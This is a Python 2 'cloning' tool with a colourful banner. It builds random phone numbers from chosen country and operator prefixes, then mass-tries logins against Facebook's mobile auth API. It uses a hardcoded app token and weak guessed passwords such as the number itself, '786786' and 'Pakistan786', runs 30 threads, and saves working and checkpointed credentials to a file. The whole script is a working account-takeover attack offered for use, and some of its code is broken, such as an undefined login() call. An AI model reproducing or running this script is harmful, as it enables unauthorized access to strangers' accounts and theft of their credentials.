import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(1000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()
 
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
 
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 nmbr.py')
 
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
 
def exb():
    print '[!] Exit'
    os.sys.exit()
 
 
def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
 
 
def t():
    time.sleep(1)
 
 
def cb():
    os.system('clear')
 
 
logo = '\n\x1b[1;33m         ------------\n\x1b[1;34m        \x1b[1;36m<:::\x1b[1;32mAyesha\x1b[1;36m:::>\n\x1b[1;33m         ------------\n\n\x1b[1;95m\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\n\x1b[1;95m\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\n\x1b[1;95m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\n\x1b[1;95m\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\n\x1b[1;95m\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\n\x1b[1;95m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\n\n\x1b[1;97m--------------------------------------------------\n\x1b[1;95m\n AUTHOR     : AYESHA ALI\n FACEBOOK   : FACEBOOK.COM/100044234123263\n GITHUB     : GITHUB.COM/AY3SHA\n\x1b[1;37m--------------------------------------------------                                '
back = 0
successful = []
cpb = []
oks = []
id = []
 
def menu():
    os.system('clear')
    print logo
    print '\x1b[1;96m\xe2\x8a\xb1\xe2\x8b\x95\xe2\x8a\xb0\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x8a\xb1\xe2\x8b\x95\xe2\x8a\xb0\n'
    print '\x1b[1;94m               [1]\x1b[1;96m  Bangladesh'
    print '\x1b[1;94m               [2]\x1b[1;93m  USA'
    print '\x1b[1;94m               [3]\x1b[1;96m  UK'
    print '\x1b[1;94m               [4] \x1b[1;93m India'
    print '\x1b[1;94m               [5]\x1b[1;96m  Brazil'
    print '\x1b[1;94m               [6]\x1b[1;93m  Japan'
    print '\x1b[1;94m               [7]\x1b[1;96m  Korea'
    print '\x1b[1;94m               [8]\x1b[1;93m  Italy'
    print '\x1b[1;94m               [9]\x1b[1;96m  Spain'
    print '\x1b[1;94m               [10]\x1b[1;93m Poland'
    print '\x1b[1;94m               [11]\x1b[1;96m Pakistan'
    print '\x1b[1;94m               [12]\x1b[1;93m Indonisia'
    print '\x1b[1;94m               [13]\x1b[1;91m Update Tool'
    print '                [0]\x1b[1;97m  Exit            '
    print '\x1b[1;96m\xe2\x8a\xb1\xe2\x8b\x95\xe2\x8a\xb0\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x8a\xb1\xe2\x8b\x95\xe2\x8a\xb0\n'
    action()
 
 
def action():
    global cpb
    global oks
    bch = raw_input('\n\x1b[1;91m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90[ASHI]>  ')
    if bch == '':
        print '[!] Fill in correctly'
        action()
    elif bch == '1':
        os.system('clear')
        print logo
        print '\x1b[1;93m175,165,191, 192, 193, 194, 195, 196, 197, 198, 199'
        try:
            c = raw_input('\x1b[1;96m choose code  : ')
            k = '+880'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '2':
        os.system('clear')
        print logo
        print '786, 815, 315, 256, 401, 718, 917, 202, 701, 303, 703, 803, 999, 708'
        try:
            c = raw_input(' choose code  : ')
            k = '+1'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '3':
        os.system('clear')
        print logo
        print '737, 706, 748, 783, 739, 759, 790'
        try:
            c = raw_input(' choose code  : ')
            k = '+44'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '4':
        os.system('clear')
        print logo
        print '954, 897, 967, 937, 700, 727, 965, 786, 874, 856, 566, 590, 527, 568, 578'
        try:
            c = raw_input(' choose code  : ')
            k = '+91'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '5':
        os.system('clear')
        print logo
        print '127, 179, 117, 853, 318, 219, 834, 186, 479, 113'
        try:
            c = raw_input(' choose code  : ')
            k = '+55'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '6':
        os.system('clear')
        print logo
        print '11, 12, 19, 16, 15, 13, 14, 18, 17'
        try:
            c = raw_input(' choose code  : ')
            k = '+81'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '7':
        os.system('clear')
        print logo
        print '1, 2, 3, 4, 5, 6, 7, 8, 9'
        try:
            c = raw_input(' choose code  : ')
            k = '+82'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '8':
        os.system('clear')
        print logo
        print '388, 390, 391, 371, 380, 368, 386, 384, 332, 344, 351, 328'
        try:
            c = raw_input(' choose code  : ')
            k = '+39'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '9':
        os.system('clear')
        print logo
        print '60, 76, 73, 64, 69, 77, 65, 61, 75, 68'
        try:
            c = raw_input(' choose code  : ')
            k = '+34'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '10':
        os.system('clear')
        print logo
        print '66, 69, 78, 79, 60, 72, 67, 53, 51'
        try:
            c = raw_input(' choose code  : ')
            k = '+48'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '11':
        os.system('clear')
        print logo
        print '\x1b[1;93m01, ~to~~, 49'
        try:
            c = raw_input(' choose code  : ')
            k = '03'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '12':
        os.system('clear')
        print logo
        print '\x1b[1;93m81,83,85,84,89,'
        try:
            c = raw_input(' choose code  : ')
            k = '+1'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
 
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
 
    elif bch == '13':
        os.system('xdg-open https://www.youtube.com/channel/UC5jned7it1eduNGSHP9C0qw')
        login()
    elif bch == '0':
        exb()
    else:
        print '[!] Fill in correctly'
        action()
    xxx = str(len(id))
    psb('[\xe2\x9c\x93] Total Numbers: ' + xxx)
    time.sleep(0.5)
    psb('\x1b[1;91m[\xe2\x9c\x93]\x1b[1;94m Please wait, process is running ...')
    time.sleep(0.5)
    psb('[!] To Stop Process Press CTRL Then Press z')
    time.sleep(0.5)
    print '\x1b[1;96m\xe2\x8a\xb1\xe2\x8b\x95\xe2\x8a\xb0\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x8a\xb1\xe2\x8b\x95\xe2\x8a\xb0\n'
 
    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass
 
        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;32mSuccessful  ' + k + c + user + '  |  ' + pass1
                okb = open('save/cloned.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;31mCheckpoint ' + k + c + user + '  |  ' + pass1
                cps = open('save/cloned.txt', 'a')
                cps.write(k + c + user + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = '786786'
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;32mSuccessful  ' + k + c + user + '  |  ' + pass2
                    okb = open('save/cloned.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;31mCheckpoint ' + k + c + user + '  |  ' + pass2
                    cps = open('save/cloned.txt', 'a')
                    cps.write(k + c + user + pass2 + '\n')
                    cps.close()
                    cpb.append(c + user + pass2)
                else:
                    pass3 = 'Pakistan'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;32mSuccessful  ' + k + c + user + '  |  ' + pass3
                        okb = open('save/cloned.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;31mCheckpoint ' + k + c + user + '  |  ' + pass3
                        cps = open('save/cloned.txt', 'a')
                        cps.write(k + c + user + pass3 + '\n')
                        cps.close()
                        cpb.append(c + user + pass3)
                    else:
                        pass4 = 'Pakistan786'
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;32mSuccessful  ' + k + c + user + '  |  ' + pass4
                            okb = open('save/cloned.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;31mCheckpoint ' + k + c + user + '  |  ' + pass4
                            cps = open('save/cloned.txt', 'a')
                            cps.write(k + c + user + pass4 + '\n')
                            cps.close()
                            cpb.append(c + user + pass4)
                        else:
                            pass5 = '786786'
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;32mSuccessful  ' + k + c + user + '  |  ' + pass5
                                okb = open('save/cloned.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;31mCheckpoint ' + k + c + user + '  |  ' + pass5
                                cps = open('save/cloned.txt', 'a')
                                cps.write(k + c + user + pass5 + '\n')
                                cps.close()
                                cpb.append(c + user + pass5)
        except:
            pass
 
    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;96m\xe2\x8a\xb1\xe2\x8b\x95\xe2\x8a\xb0\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x8a\xb1\xe2\x8b\x95\xe2\x8a\xb0'
    print '[\xe2\x9c\x93] Process Has Been Completed ....'
    print '[\xe2\x9c\x93] Total OK/CP : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[\xe2\x9c\x93] CP File Has Been Saved : save/checkpoint.txt'
    raw_input('\n[Press Enter To Go Back]')
    os.system('python2 .README.md')
 
 
if __name__ == '__main__':
    menu()
